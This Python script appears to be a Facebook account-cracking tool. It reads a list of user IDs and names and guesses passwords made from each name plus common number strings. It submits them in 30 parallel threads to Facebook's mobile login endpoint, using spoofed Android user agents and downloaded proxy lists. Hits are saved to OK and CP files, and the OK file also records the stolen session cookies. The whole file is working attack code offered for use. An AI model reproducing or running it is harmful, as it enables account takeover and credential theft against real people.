import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import requests, sys, time, re, random
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from time import time as mek
file_ha=[]
for file in os.listdir():
 if os.path.isfile(file):
  file_ha.append(file)
  g=file
pretty.install()
CON=sol() 
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]


from urllib import request


proxy = request.ProxyHandler(


{"http":"167.0.0.1:443"}


)


request.install_opener(request.build_opener(proxy))





import requests


try:


 prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text


 open('.prox.txt','w').write(prox)


except Exception as e:


 print(' ')


prox=open('.prox.txt','r').read().splitlines()



try:
	prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:pass
prox=open('.prox.txt','r').read().splitlines()
def generate_user_agent_android():
    version_a = f'{random.randrange(1, 9)}.{random.randrange(1, 9)}'
    device_a = '11; Redmi Note 5A Lite)'
    extras_a = f'{random.randrange(100, 9999)} AppleWebKit/537.36 (KHTML, like Gecko) {random.randrange(1, 9)}.{random.randrange(1, 4)}.{random.randrange(1, 4)}.{random.randrange(1, 4)} Chrome/96.0.4664.45 Mobile Safari/537.36'
    return f'Mozilla/5.0 (Linux; Android {version_a} {device_a} {extras_a}'
ugen2 = [generate_user_agent_android() for _ in range(10000)]
def generate_user_agent_android_12():
    version_b = '12;'
    device_b = 'M2101K6G'
    letter = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    number = random.randrange(1, 999)
    extras_b = f'Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) {random.randrange(80, 103)}.0.0.{random.randrange(4200, 4900)} {random.randrange(40, 150)} Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
    return f'Mozilla/5.0 (Linux; Android {version_b} {letter}{device_b}{number}{letter}) {extras_b}'
ugen = [generate_user_agent_android_12() for _ in range(10000)]
id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni = [], [], 0, 0, 0, [], [], [], [], [], [], [], []
cokbrut = []
pwpluss, pwnya = [], []
x = ''
okc = 'OK.txt'
cpc = 'CP.txt'
def CRACK_FILE():
	jum = input('[?] FILE : ')
	for line in open(jum, 'r').readlines():
		id.append(line.strip())
	print('[•] TOTAL ID : '+str(len(id)))
	setting()
def setting():
    id2.extend(random.sample(id, len(id)))
    method.append('mobile')
    taplikasi.append('ya')
    pwpluss.append('no')
    passwrd()
def passwrd():
    with tred(max_workers=30) as pool:
        for idf, nmf in (yuzong.split('|')[:2] for yuzong in id2):
            frs = nmf.split(' ')[0]
            pwv = [nmf] if len(frs) >= 3 else [nmf, '123456']
            if len(nmf) >= 6 and len(frs) >= 3:
                pwv.extend(['112233112233', '00998877', '0770770', nmf, '19901990', '19911991', '112233445566778899', '1234512345', '10203040', '19951995', 'zzxxccvv', '0987654321', '1q2w3e4r5t', '12345@12345'])
            pwv.extend(pwnya if 'ya' in pwpluss else [])
            pool.submit(crack, idf, pwv)
    print(f'[•] OK : {ok}\n[•] CP : {cp}\n[•] complate') and exit()
def crack(idf, pwv):
    global loop, ok, cp
    bi, fff = '', '%'
    pers = loop * 10000 / len(id2)
    print(f'\r{bi}[DEMO] {loop}/{len(id2)} » [OK] {ok} » [CP] {cp} » {int(pers)}{fff}{x}', end=' ')
    sys.stdout.flush()
    ua, ua2, ses = random.choice(ugen), random.choice(ugen2), requests.Session()
    for pw in pwv:
        try:
            ses.headers.update({"Host": 'm.facebook.com', "upgrade-insecure-requests": "1", "user-agent": ua2,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin",
                                "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                                "referer": "https://m.facebook.com/", "accept-encoding": "gzip, deflate br",
                                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                     "jazoest": re.search('name="jazoest" value="(.*?)"', str(p)).group(1), "uid": idf,
                     "flow": "login_no_pin", "pass": pw, "next": "https://developers.facebook.com/tools/debug/accesstoken/"}
            ses.headers.update({"Host": 'm.facebook.com', "cache-control": "max-age=0",
                                "upgrade-insecure-requests": "1", "origin": "https://m.facebook.com",
                                "content-type": "application/x-www-form-urlencoded", "user-agent": ua,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin",
                                "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                                "referer": "https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                                "accept-encoding": "gzip, deflate br", "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa,
                          allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(f'{idf}|{pw}')
                    ceker(idf, pw)
                else:
                    print('\n')
                    statuscp = f'CP\n{idf}\n{pw}'
                    statuscp1 = nel(statuscp, style='red')
                    cetak(nel(statuscp1, title='SESI'))
                    open(f'CP/{cpc}', 'a').write(f'{idf}|{pw}\n')
                    akun.append(f'{idf}|{pw}')
                    cp += 1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                headapp = {"user-agent": "NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
                if 'no' in taplikasi or 'ya' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                    open(f'OK/{okc}', 'a').write(f'{idf}|{pw}|{kuki}\n')
                    print('\n')
                    statusok = f'OK\n{idf}\n{pw}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title=' NO SESI'))
                    break
        except :pass
    loop += 1
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/Enter thexx.info')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	CRACK_FILE()